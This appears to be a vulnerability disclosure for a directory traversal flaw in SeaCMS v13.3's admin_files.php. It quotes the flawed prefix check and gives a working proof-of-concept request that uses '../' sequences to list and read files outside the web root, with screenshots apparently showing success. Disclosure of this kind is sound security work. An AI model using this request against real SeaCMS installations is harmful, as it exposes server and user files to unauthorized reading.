  admin_files.php    Directory traversal

### Introduction

SeaCMS v13.3 has a directory traversal vulnerability. This vulnerability is due to the fact that, despite having restrictions on the file directories to be read, these restrictions are still imperfect, allowing an attacker to arbitrarily read the file directories on the server, not just the web directory, including any file directory on the server, which results in traversing all files and can be read based on the file to reach greater harm

SeaCMS 官方网站： [SeaCMS - 开源免费 PHP 电影系统、电影 CMS、视频 CMS、电影 CMS、SEACMS](https://www.seacms.com/)

Click to download

![image-20250402105820409](https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202504021122959.png)

You can see the latest version v13.3



### Vulnerability analysis and exploitation

The vulnerable code is located at : When that parameter is passed, there is no path traversal check, allowing the attacker to construct it themselves, which can be done by passing the following parameters

```
else
{
	if(empty($path)) $path=$dirTemplate; else $path=strtolower($path);
	if(substr($path,0,$dirlen)!=$dirTemplate){
		ShowMsg("只允许编辑附件目录！","admin_files.php");
		exit;
	}
	$flist=getFolderList($path);
	include(sea_ADMIN.'/templets/admin_files.htm');
	exit();
}
```

We can construct a filedir to traverse the directory

```
/4w8vn/admin_files.php?path=../uploads/../../../../../../test
```

#### Exploit POC

We can create a new test file outside the web directory to do this

![image-20250402130845663](https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202504021314783.png)

![image-20250402130907994](https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202504021314622.png)

Then construct the parameters

![image-20250402131116891](https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202504021314491.png)



With it, we can see that the file has been read successfully

Now let's take it a step further and try to see if we can read the rest of the files on Windows

![image-20250402131303050](https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202504021314546.png)

![image-20250402131351013](https://badboy0.oss-cn-beijing.aliyuncs.com/pictures/202504021314612.png)

We can see that the files on the desktop are also read successfully



In summary, an attacker can exploit this vulnerability to read any file on the deployer's computer